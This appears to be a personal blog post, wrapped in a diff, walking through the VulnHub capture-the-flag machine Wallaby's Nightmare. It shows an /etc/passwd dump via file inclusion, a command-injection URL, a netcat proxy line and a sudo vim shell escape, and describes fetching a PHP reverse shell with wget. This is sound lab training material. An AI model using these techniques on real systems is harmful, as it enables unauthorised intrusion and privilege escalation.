@@ -1,0 +1,88 @@
+<html>
+    <head>
+        <link rel="stylesheet" type="text/css" href="/css/cjc.css" />
+        <title>cjc.im</title>
+    </head>
+    <body>
+    <div id="main">
+        <h2><a href="/">cjc.im</a>
+ / <a href="/posts">posts</a> / Wallabys Nightmare Walkthrough</h2>
+<p>So, I finally took the plunge and decided to attempt a machine from vulnhub, starting with the newest post, Wallaby's Nightmare.</p>
+<h3 id="walkthrough">Walkthrough</h3>
+<p>First was a cursory nmap scan of the machine, revealing port 80 open and 6667 filtered.</p>
+<p>So, irc is there but I can't connect, and a webserver is open. Lets jump in and see what the webserver has to offer.</p>
+<p>After entering my name I noticed a few attempts of some injection on the page variable led to the machine no longer listening on port 80, which at first I thought was it crashing, but it turns out was part of the design.</p>
+<p>Another nmap scan showed that port 60080 was now being used. Sneaky!</p>
+<p>Broke out dirb, to see if there was anything interesting on there to no avail.</p>
+<p>Attempting a Local File Inclusion gave me:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash 
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+bin:x:2:2:bin:/bin:/usr/sbin/nologin 
+sys:x:3:3:sys:/dev:/usr/sbin/nologin 
+sync:x:4:65534:sync:/bin:/bin/sync 
+games:x:5:60:games:/usr/games:/usr/sbin/nologin 
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
+syslog:x:104:108::/home/syslog:/bin/false 
+_apt:x:105:65534::/nonexistent:/bin/false 
+uuidd:x:107:111::/run/uuidd:/bin/false 
+walfin:x:1000:1000:walfin,,,:/home/walfin:/bin/bash 
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin 
+mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false 
+steven?:x:1001:1001::/home/steven?:/bin/bash
+ircd:x:1003:1003:,,,:/home/ircd:/bin/bash</code></pre>
+<p>walfin and steven? -- (See more on this later, brute forcing these users led to nothing)</p>
+<p>Lets try another approach here, dirb on the page variable, we know of home and blacklist here. The blacklist was actually running from javascript to block someone, but I failed to do any SQLi on it...</p>
+<pre><code>GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.56.101:60080/index.php?page= ----
++ http://192.168.56.101:60080/index.php?page=.git/HEAD (CODE:200|SIZE:896)                                                                            
++ http://192.168.56.101:60080/index.php?page=.svn/entries (CODE:200|SIZE:896)                                                                         
++ http://192.168.56.101:60080/index.php?page=_vti_bin/_vti_adm/admin.dll (CODE:200|SIZE:896)                                                          
++ http://192.168.56.101:60080/index.php?page=_vti_bin/_vti_aut/author.dll (CODE:200|SIZE:896)                                                         
++ http://192.168.56.101:60080/index.php?page=_vti_bin/shtml.dll (CODE:200|SIZE:896)                                                                   
++ http://192.168.56.101:60080/index.php?page=cgi-bin/ (CODE:200|SIZE:896)                                                                             
++ http://192.168.56.101:60080/index.php?page=CVS/Entries (CODE:200|SIZE:896)                                                                          
++ http://192.168.56.101:60080/index.php?page=CVS/Repository (CODE:200|SIZE:896)                                                                       
++ http://192.168.56.101:60080/index.php?page=CVS/Root (CODE:200|SIZE:896)                                                                             
++ http://192.168.56.101:60080/index.php?page=home (CODE:200|SIZE:1143)                                                                                
++ http://192.168.56.101:60080/index.php?page=index (CODE:200|SIZE:1358)                                                                               
++ http://192.168.56.101:60080/index.php?page=mailer (CODE:200|SIZE:1081)                                                                              </code></pre>
+<p>What's this mailer page? Lets take a look, and view the page source...</p>
+<pre><code>&lt;!--a href=&#39;/?page=mailer&amp;mail=mail wallaby &quot;message goes here&quot;&#39;&gt;&lt;button type=&#39;button&#39;&gt;Sendmail&lt;/button--&gt;</code></pre>
+<p>This can't just be running commands, right? it is....</p>
+<pre><code>http://192.168.56.101:60080/?page=mailer&amp;mail=ls%20-l</code></pre>
+<p>cat the index.php which gave us...</p>
+<pre><code>elseif (strpos($page, &#39;/etc/passwd&#39;) !== false) {
+    include &#39;s13!34g$3FVA5e@ed/honeypot.php&#39;;
+    }</code></pre>
+<p>haha so that was fake, nice</p>
+<p>Ok, so now we can run some commands, and we know we have php, lets get a reverse shell going so we can run commands easier than through a php script. Using http://pentestmonkey.net/tools/web-shells/php-reverse-shell which we get across by running a local server and issuing a wget command via the mail parameter. From this we now have a shell as the www-data user that the webserver is running as.</p>
+<p>Maybe I could proxy the ircd port and see what's there</p>
+<pre><code>nc -l -k -p 5678 &lt; fifo | nc localhost 6667 &gt; fifo</code></pre>
+<p>Not working, lets have a nosey around all the directories we can access as the www-data user</p>
+<p>Noticed a .sudo_as_admin_successful, interesting that a couple of users can both issue sudo commands, what can www-data user do? We find out by running sudo -l, we can run iptables, and a vim command to change some apache file. we clear the ip tables to allow us to access the irc server.</p>
+<p>On the irc network there is an irc bot, sopel bot, which has a .run command to run commands on the server, however this can only be issued as the waldo irc user, which is online and in use, drat...</p>
+<p>Looking back at the output from sudo -l, lets run vim as waldo</p>
+<pre><code>sudo -u waldo /usr/bin/vim /etc/apache2/sites-available/000-default.conf</code></pre>
+<p>Ok, in vim, as waldo we can run :!/bin/sh to gain a shell as waldo, run ps -a, get the process number for his irc client and kill it!</p>
+<p>On irc, switch nick to waldo and now we can use the .run command, created a script in /tmp that runs in the context of wallaby, who, strangely can sudo all the things, game over.</p>
+<pre><code>sudo ls /root
+sudo cat /root/flag.txt</code></pre>
+<p>done</p>
+<strong>Tags: </strong>
+<i><a href="/tag/infosec">infosec</a></i>
+        <br />
+        </div>
+        </div>
+    </body>
+</html>
